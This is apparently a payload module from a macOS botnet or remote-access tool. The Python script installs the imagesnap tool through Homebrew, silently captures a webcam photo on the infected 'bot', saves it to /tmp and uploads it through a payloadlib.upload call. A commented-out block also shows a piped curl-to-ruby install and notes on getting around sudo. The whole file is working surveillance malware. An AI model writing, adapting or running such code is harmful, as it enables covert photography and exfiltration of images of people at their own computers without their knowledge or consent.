'''
NAME: Webcam Picture
DESCRIPTION: Takes webcam image and saves image to bot's /tmp folder with a date-time stamp
'''
import os
import subprocess
import datetime
import sys

'''Takes webcam image and saves image to bot's /tmp folder with a date-time stamp
    Note: installing brew may seem extreme, but ideally we would like all bots to end up with brew at some point'''

# if os.system('which -s brew') != 0:
#     # Cannot actually install homebrew since sudo is required, need full terminal or
#     # tricky askpass program shenanigans
#     print("Installing Homebrew")
#     # user does not have brew, must install
#     os.system('ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"')
#

if os.system('which -s imagesnap') != 0 and os.system('which -s brew') == 0:
    print "Installing imagesnap..."
    # user does not have imagesnap, must install
    os.system('brew install imagesnap')

if os.system('which -s imagesnap') == 0:
    filename = '/tmp/image-{}.png'.format(datetime.datetime.now().strftime('%Y-%m-%d-%H-%M'))

    print "Taking picture..."
    # take image and save it in tmp, then respond with output
    proc = subprocess.Popen(['imagesnap', filename],
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
    (out, err) = proc.communicate()

    payloadlib.upload(filename)

    sys.stderr.write(err)
    sys.stdout.write(out)
else:
    sys.stderr.write("Failed to install imagesnap")
